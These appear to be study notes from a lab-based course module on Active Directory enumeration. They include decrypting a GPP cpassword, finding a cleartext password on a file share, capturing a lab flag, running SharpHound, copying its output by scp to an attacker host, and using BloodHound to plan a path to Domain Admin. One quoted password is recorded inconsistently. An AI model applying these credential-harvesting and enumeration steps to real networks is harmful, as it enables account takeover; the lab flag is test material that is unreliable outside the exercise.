d-----         9/21/2022   1:13 AM                oldpolicy
d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
```

All folders are of interest but we will explore `oldpolicy` first and find a file named `old-policy-backup.xml`.
```powershell
PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
          noChange="0"
          neverExpires="0"
          acctDisabled="0"
          userName="Administrator (built-in)"
          expires="2016-02-10" />
  </User>
</Groups>
```
- Note `cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"`

Due to the naming convention, it appears this is an older domain policy file.  Domain admins often forget about them when implementing new policy, they are a common artifact.  In this case the XML describes and old policy, helpful for learning about the new policies, and an encrypted password for the local built in admin account.  The encrypted password could be extremely valuable.

Sys admins often change local workstation passwords through [Group Policy Preferences (GPP)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)).  

Although GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on [MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2).  We can use the key to decrypt these passwords, we will use `gpp-decrypt` Ruby script in Kali.
```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```bash
- We successfullly decrypt the password and make note of `P@$$w0rd`

`Find-DomainShare` revealed another share of potential interest.  Let's check out `docshare` on `FILES04.corp.com`, which is not the default share.
```powershell
PS C:\Users\stephanie> ls \\FILES04\docshare


    Directory: \\FILES04\docshare


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   2:02 AM                docs
```

Deeper in the folder structure we find a `do-not-share` folder containing `start-email.txt`.
```powershell
PS C:\Users\stephanie> ls \\FILES04\docshare\docs\do-not-share\


    Directory: \\FILES04\docshare\docs\do-not-share


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2022   2:02 AM           1142 start-email.txt


PS C:\Users\stephanie> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
Hi Jeff,

We are excited to have you on the team here in Corp. As Pete mentioned, we have been without a system administrator
since Dennis left, and we are very happy to have you on board.

Pete mentioned that you had some issues logging in to your Corp account, so I'm sending this email to you on your personal address.

The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11

As you may be aware, we are taking security more seriously now after the previous breach, so please change the password at first login.

Best Regards
Stephanie



...............



Hey Stephanie,

Thank you for the warm welcome. I heard about the previous breach and that Dennis left the company.

Fortunately he gave me a great deal of documentation to go through, although in paper format. I'm in the
process of digitalizing the documentation so we can all share the knowledge. For now, you can find it in
the shared folder on the file server.

Thank you for reminding me to change the password, I will do so at the earliest convenience.

Best regards
Jeff
```

According to the file, `jeff` stored an email with a possible cleartext password, `HenchmanPutridConcon11!`.  The password may have been changed, but we make not of it.  With this and the password we collected earlier we are building a rough profile of the password policy for users/computers in the org.  We can use this to create wordlists for password brute forcing, if needed.


###### Labs

Start VM Group 2 and log in to CLIENT75 as stephanie. Use PowerView to locate the shares in the modified corp.com domain and enumerate them to obtain the flag.
```powershell
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Find-DomainShare

Name                  Type Remark                 ComputerName
----                  ---- ------                 ------------
ADMIN$          2147483648 Remote Admin           DC1.corp.com
C$              2147483648 Default share          DC1.corp.com
IPC$            2147483651 Remote IPC             DC1.corp.com
NETLOGON                 0 Logon server share     DC1.corp.com
SYSVOL                   0 Logon server share     DC1.corp.com
ADMIN$          2147483648 Remote Admin           web04.corp.com
backup                   0                        web04.corp.com
C$              2147483648 Default share          web04.corp.com
IPC$            2147483651 Remote IPC             web04.corp.com
ADMIN$          2147483648 Remote Admin           FILES04.corp.com
C                        0                        FILES04.corp.com
C$              2147483648 Default share          FILES04.corp.com
docshare                 0 Documentation purposes FILES04.corp.com
Important Files          0                        FILES04.corp.com
IPC$            2147483651 Remote IPC             FILES04.corp.com
Tools                    0                        FILES04.corp.com
Users                    0                        FILES04.corp.com
Windows                  0                        FILES04.corp.com
ADMIN$          2147483648 Remote Admin           client74.corp.com
C$              2147483648 Default share          client74.corp.com
IPC$            2147483651 Remote IPC             client74.corp.com
ADMIN$          2147483648 Remote Admin           client75.corp.com
C$              2147483648 Default share          client75.corp.com
IPC$            2147483651 Remote IPC             client75.corp.com
sharing                  0                        client75.corp.com
ADMIN$          2147483648 Remote Admin           CLIENT76.corp.com
C$              2147483648 Default share          CLIENT76.corp.com
IPC$            2147483651 Remote IPC             CLIENT76.corp.com


PS C:\Tools> ls "\\FILES04\Important Files\"


    Directory: \\FILES04\Important Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/6/2023   6:49 AM             78 proof.txt


PS C:\Tools> cat "\\FILES04\Important Files\proof.txt"
OS{ea2588fec91cf362f27acc35443a727b}
```


#### 5. Active Directory - Automated Enumeration

- Collect domain data using SharpHound.
- Analyze the data using BloodHound.

Some automated tools, like [PingCastle](https://www.pingcastle.com/), generate gorgeous reports although most require paid licenses for commercial use. In our case, we will focus on [BloodHound](https://bloodhound.readthedocs.io/en/latest/), an excellent free tool that's extremely useful for analyzing AD environments.

It's worth noting that automated tools generate a great deal of network traffic and many administrators will likely recognize a spike in traffic as we run these tools.

##### Collecting Data with SharpHound

In the next section we will use BloodHound to analyze, sort, and present data, and us the companion tool [SharpHound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html) to collect the data.  Sharphound is written in C# and uses Windows API functions with LDAP namespace functions similar to those we manually used in prior sections.  Example, SharpHound will attempt to use `NetWkstaUserEnum` and `NetSessionEnum` to enum logged-on sessions, as we did earlier.  It will also run queries agains the Remote Registry service, that we leveraged earlier.

*It's often best to combine automatic and manual enumeration techniques when assessing Active Directory. Even though we could theoretically gather the same information with a manual approach, graphical relationships often reveal otherwise unnoticed attack paths.*

First we need to get SharpHound up and running, it is available in several formats.  We can compile it ourselves, use a precompiled bin, or use it as a PowerShell script.  In this case, we will use the PowerShell script located in `C:\Tools` of CLIENT75.  Let's open a PowerShell session and import the script.

We can now start collecting domain data.  In order to run SharpHound, we must first run `Invoke-BloodHound`, which isn't intuitive since we're only running SharpHound.  Use `Get-Help` to learn more about the command.
```powershell
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> cd C:\Tools\
PS C:\Tools> Import-Module .\SharpHound.ps1
PS C:\Tools> Get-Help Invoke-BloodHound

NAME
    Invoke-BloodHound

SYNOPSIS
    Runs the BloodHound C# Ingestor using reflection. The assembly is stored in this file.


SYNTAX
    Invoke-BloodHound [-CollectionMethods <String[]>] [-Domain <String>] [-SearchForest]
    [-Stealth] [-LdapFilter <String>] [-DistinguishedName <String>] [-ComputerFile <String>]
    [-OutputDirectory <String>] [-OutputPrefix <String>] [-CacheName <String>] [-MemCache]
    [-RebuildCache] [-RandomFilenames] [-ZipFilename <String>] [-NoZip] [-ZipPassword <String>]
    [-TrackComputerCalls] [-PrettyPrint] [-LdapUsername <String>] [-LdapPassword <String>]
    [-DomainController <String>] [-LdapPort <Int32>] [-SecureLdap] [-DisableCertVerification]
    [-DisableSigning] [-SkipPortCheck] [-PortCheckTimeout <Int32>] [-SkipPasswordCheck]
    [-ExcludeDCs] [-Throttle <Int32>] [-Jitter <Int32>] [-Threads <Int32>]
    [-SkipRegistryLoggedOn] [-OverrideUsername <String>] [-RealDNSName <String>]
    [-CollectAllProperties] [-Loop] [-LoopDuration <String>] [-LoopInterval <String>]
    [-StatusInterval <Int32>] [-Verbosity <Int32>] [-Help] [-Version] [<CommonParameters>]


DESCRIPTION
    Using reflection and assembly.load, load the compiled BloodHound C# ingestor into memory
    and run it without touching disk. Parameters are converted to the equivalent CLI arguments
    for the SharpHound executable and passed in via reflection. The appropriate function
    calls are made in order to ensure that assembly dependencies are loaded properly.


RELATED LINKS

REMARKS
    To see the examples, type: "get-help Invoke-BloodHound -examples".
    For more information, type: "get-help Invoke-BloodHound -detailed".
    For technical information, type: "get-help Invoke-BloodHound -full".
```

We start with the `-CollectionMethod`, which describes the various [collection methods](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html).  We'll attempt to gather all data, which will perform all collection methods except for local group policies.

SharpHound will gather data in JSON files, automatically zipping them, by default which makes it easier to transfer files to Kali.  Save the output file on our desktop with the "corp audit" prefix as shown below.

Data collection may tabke a few minutes, depending on the size of the env.  Let's examine the output.
```powershell
PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
2023-12-06T07:19:33.4933370-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-12-06T07:19:33.6181269-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-12-06T07:19:33.6316517-08:00|INFORMATION|Initializing SharpHound at 7:19 AM on 12/6/2023
2023-12-06T07:19:33.7267368-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for corp.com : DC1.corp.com
2023-12-06T07:19:33.8992633-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-12-06T07:19:34.0556118-08:00|INFORMATION|Beginning LDAP search for corp.com
2023-12-06T07:19:34.1180369-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-12-06T07:19:34.1180369-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-12-06T07:20:04.8528820-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 106 MB RAM
2023-12-06T07:20:20.5243486-08:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-12-06T07:20:20.5712259-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-12-06T07:20:20.6806067-08:00|INFORMATION|Status: 106 objects finished (+106 2.304348)/s -- Using 111 MB RAM
2023-12-06T07:20:20.6806067-08:00|INFORMATION|Enumeration finished in 00:00:46.6267806
2023-12-06T07:20:20.7431021-08:00|INFORMATION|Saving cache with stats: 65 ID to type mappings.
 67 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-12-06T07:20:20.7587336-08:00|INFORMATION|SharpHound Enumeration Completed at 7:20 AM on 12/6/2023! Happy Graphing!
```
- We scanned a total of 106 objects.
 - Varies based on objects and sessions in the domain.

SharpHound took a "snapshot" of the domain from the `stephanie` user, allowing us to analyze everything the user account has access to.  The data is store in a zip file on the user's desktop.
```powershell
PS C:\Tools> ls C:\Users\stephanie\Desktop\


    Directory: C:\Users\stephanie\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/6/2023   7:20 AM          12752 corp audit_20231206072020_BloodHound.zip
-a----         12/6/2023   7:20 AM           9689 MTk2MmZkNjItY2IyNC00MWMzLTk5YzMtM2E1ZDcwYThkMzRl
                                                  .bin
```
- We'll us this file in the next section as we analyze the data with BloodHound.
- SharpHound created a bin cache file to speed up data collection.
 - This is not needed for analysis and we can delete it.

Note that SharpHound also supports looping, which has the collector run cyclical queries of our choice over a given period of time.  The method we used above created a snapshot of the domain, running it in a loop can gather additional info as the env changes.  The cache file speeds up the process.  Example, if a user logged on after we created our snapshot we would have missed it.  We will not use the loop func here, but recommend experimenting with it in training labs and inspecting hte results in BloodHound.

##### Analysing Data using BloodHound

In this section we will analyze the domain data using BloodHound in Kali, it should be noted that we can install the app and deps on Win systems as well.

To use BloodHound, we need to start the [Neo4j](https://neo4j.com/) service, which is installed by default.  Note, when BloodHound is installed with APT, the Neo4j service is automatically installed.

Neo4j is an open source graph DB (NoSQL) that creates nodes, edges, and properties instead of simple rows and columns.  This visualizes our collected data, start the Neo4j service.
```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ sudo neo4j start           
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:334850). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```
- The Neo4j service is now running and available at `http://localhost:7474`
 - Default creds `neo4j/neo4j`
- Browse to Neo4j.
 - Login with default creds.
 - We are prompted to set a new password.
  - Note the password as we will use it to auth to the DB later.
  - New creds `neo4j/neotoor`

We can now auth to the DB and run our own queries against it.  Since we haven't imported any data yet there isn't much we can do and we would prefer to let BloodHound run the queries for us.

With Neo4j running, start BloodHound.
```bash
┌──(operator㉿labhost)-[~/OffSec]
└─$ bloodhound
```
- Once started, log in to the Neo4j DB.
 - The green check mark in the first col indicates BlooHound has detected the running Neo4j DB.

We don't have any visual data yet as we haven't imported anything.  To import the data we must first transfer the data zip from our Win machine to Kali.  
```powershell
PS C:\Users\stephanie> scp '.\Desktop\corp audit_20231207063037_BloodHound.zip' admin@192.168.45.174:~/
admin@192.168.45.174's password:
corp audit_20231207063037_BloodHound.zip                         100%   12KB 157.9KB/s   00:00
```

We then use the `Upload Data` func on the right side of the GUI to upload the Zip, or drap and drop it into the main window of BloodHound.  Either way, the progress bar indicates the upload progress.  Once finished, we can close the upload progress window.

Now we can start analyzing data.  Let's get a sense of how much data is in the DB.  Click the "More Info" tab in the top-left of the window.  Our env is small and doesn't contain much, but in larger envs the DB may take some time to update.  In those cases we can use the "Refresh Database Stats" button to present an updated view.

From our info, we have discovered 4 total sessions in the domain, enumed using `NetSessionEnum` and `PsLoggedOn`.  We have discovered numerous ACLs, total of 10 users, 57 groups, and more.

We'll talk about "Node Info" later, there isn't much there ATM.  We are mostly interested in the "Analysis" button at this point.  Clicking it, we are presented with various pre-built options.

There are many pre-built queries, to get started we will use the "Find all Domain Admins" under "Domain Information".
![598a826b218c0697f9e9e39082ffa0e9.png](../_resources/598a826b218c0697f9e9e39082ffa0e9.png)

We are presented with the map below.
![85b98c8defdefd88688fbe43d08d2017.png](../_resources/85b98c8defdefd88688fbe43d08d2017.png)

Each of the cirlce icons are known as a nodes, we can drag them and move them in the iface.  We see 3 connected nodes, Bloodhound placed them far from eachother, so we can drag them closer to keep things tidy.

![822162ae5b6026ef37c2082ec1ca04af.png](../_resources/822162ae5b6026ef37c2082ec1ca04af.png)
To see what the 2 left nodes represent we can hover over them or toggle info by pressing `ctrl`.  We can tell BloodHound how to show this info by clicking settings on the right side of the iface and setting Node Label Display to Always Display:
![a65f311584791543037dc4f3ff2c7a92.png](../_resources/a65f311584791543037dc4f3ff2c7a92.png)

Based on this view the domain admins are:
- `jeffadmin`
- `administrator`
BloodHound shows an edge in the form of a line between the user objects and `Domain Admins` group object, indicating the relation that the users are a member of the group.

BloodHound is capable of deep analysis, but much of its capability is out of the scope of this module.  For now, focus on the Shortest Paths shown in the analysis tab.

Starting with "Find Shortes Paths to Domain Admins" as it provides a good overview without any params.
![7aa8d6a247ad7d0eb3114c85fc819c24.png](../_resources/7aa8d6a247ad7d0eb3114c85fc819c24.png)

We can analyze the BloodHound graphs to determine the most effictient attack vector, the graph reveals a few things we missed in our ealier enum.

Let's focus on the `stephanie`/CLIENT74 relationship for now, Hover the mouse over the connecting strings between nodes to see the connection type.
![fd64c13fe6d0cd82655c2c2a39ef5bad.png](../_resources/fd64c13fe6d0cd82655c2c2a39ef5bad.png)

We see `stephanie` has admin privs on CLIENT74.  If we right click the line and select "? Help" we see addt info.
![9fe295f4d34568203f9f1da634a0c701.png](../_resources/9fe295f4d34568203f9f1da634a0c701.png)

As we see, `stephanie` has several ways to obtain code exec on CLIENT74.

*In the ? Help menu BloodHound also offers information in the Abuse tab, which will tell us more about the possible attack we can take on the given path. It also contains Opsec information as what to look out for when it comes to being detected, as well as references to the information displayed.*

After further analysis we see that `jeffadmin` has a connection to CLIENT74, so there may be cached credentials on the machine.  This could be critical, allowing us to steal admin creds and become domain admin.

This ties into the second "Shortest Path" for this module, the "Shortes Paths to Domain Admins from Owned Principals" query.  If we run this against `corp.com` without configuring BloodHound we receive message "NO DATA RETURNED FROM QUERY".

The "Owned Principals" is important, refering to objects we currently control in the domain.  To analyze we mark objects as "owned" in BloodHound, even if we don't have access to them yet, it is good to think in terms of "what if?" when assessing AD.  In this case we will focus on objects that we do in fact control.

We know that we control the `stephanie` user with partial control over CLIENT75, since we are logged in.  We do not have admin privs, we need to link about PrivEsc later, but for now say we have control over it.

To obtain "owned principal" in BloodHound, we run a search on top left, right click the object that shows in the middle of the screen, and click "Mark User as Owned".  Owned principals show in BloodHound with a skull icon next to the node.
![06af27f7a88df78094801e5517c81b79.png](../_resources/06af27f7a88df78094801e5517c81b79.png)

Not that if we click the icon for the object we are searching, it will be places into the "node Info" button where we can see details of the object itself.

Repeat the process for CLIENT75, clicking "Mark Computer as Owned" and we end up having two "owned principals".  Now we can run the "Shortes Paths to Domain Admins from Owned Principals" query.
*It's a good idea to mark every object we have access to as owned to improve our visibility into more potential attack vectors. There may be a short path to our goals that hinges on ownership of a particular object.*
![a6f6676ec4e486b7e88aa31168179e17.png](../_resources/a6f6676ec4e486b7e88aa31168179e17.png)
- Note that we rearranged the nodes for clarity.

Read starting from the left hand node, CLIENT75.  User `stephanie` has a session there and should be able to connect to CLIENT74 where `jeffadmin` has a session, who is part of domain admin group.  If we are able to take contorl of his account through impersonation or stealing creds on CLIENT74 we become domain admin.

While we focused on shortest paths, we highly recomend getting accustomed to the BloodHound pre-built queries withing the Challenge Labs.

In this domain, we were able to enum most info using manual methods, but in a large scale env with 1000s of users/computers this can be hard to digest.  The queries from SharpHound generate noise in the network that will likely be caught by security analysis, it is a tool worth utilizing if the situation permits as it visualizes the findings for us.

